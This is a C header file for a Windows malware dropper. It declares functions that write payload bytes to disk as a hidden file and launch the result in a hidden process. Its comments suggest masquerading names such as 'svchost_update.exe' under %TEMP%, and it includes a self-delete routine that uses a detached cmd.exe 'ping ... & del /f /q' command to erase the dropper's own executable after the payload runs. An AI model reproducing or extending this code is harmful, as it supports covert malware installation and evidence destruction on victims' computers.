#ifndef DROPPER_H
#define DROPPER_H

#include "logger.h"
#include <windows.h>

/**
 * Write raw bytes to a file on disk using CreateFile/WriteFile.
 * Creates or overwrites the destination file. The file is written with
 * FILE_ATTRIBUTE_HIDDEN so it does not appear in plain Explorer/dir listings.
 *
 * @param destPath: Absolute path to write to
 * @param data:     Bytes to write
 * @param size:     Number of bytes
 * @return: 0 on success, -1 on failure
 */
int drop_binary(const char *destPath, const BYTE *data, SIZE_T size);

/**
 * Drop bytes to destPath then spawn the resulting binary in a hidden process.
 * Convenience wrapper around drop_binary() + spawn_binary().
 *
 * @param destPath: Absolute path to write the payload to
 * @param data:     Payload bytes
 * @param size:     Number of bytes
 * @param args:     Command-line arguments appended after the binary path
 *                  (may be NULL)
 * @param slot:     Receives the thread-table slot; may be NULL
 * @return: 0 on success, -1 on failure
 */
int drop_and_execute(const char *destPath, const BYTE *data, SIZE_T size,
                     const char *args, DWORD *slot);

/**
 * Resolve a filename under %TEMP% and write the full path into buf.
 *
 * Example:
 *   char path[MAX_PATH];
 *   resolve_temp_path("svchost_update.exe", path, sizeof(path));
 *   // path → "C:\\Users\\bob\\AppData\\Local\\Temp\\svchost_update.exe"
 *
 * @param filename: Leaf filename (no directory component)
 * @param buf:      Output buffer
 * @param bufSize:  Size of buf in bytes (MAX_PATH recommended)
 * @return: 0 on success, -1 if the buffer is too small or %TEMP% is unset
 */
int resolve_temp_path(const char *filename, char *buf, SIZE_T bufSize);

/**
 * Schedule deletion of a file after this process exits.
 *
 * Spawns a hidden cmd.exe process that waits ~3 seconds (via ping) then
 * deletes the file. The cmd process is detached so it outlives the caller.
 *
 *   cmd /c ping -n 3 127.0.0.1 >nul & del /f /q "<path>"
 *
 * Typical use: pass GetModuleFileNameA output to wipe own executable after
 * the payload has been launched.
 *
 * @param path: Absolute path to the file to delete
 * @return: 0 on success, -1 on failure
 */
int self_delete(const char *path);

#endif // DROPPER_H
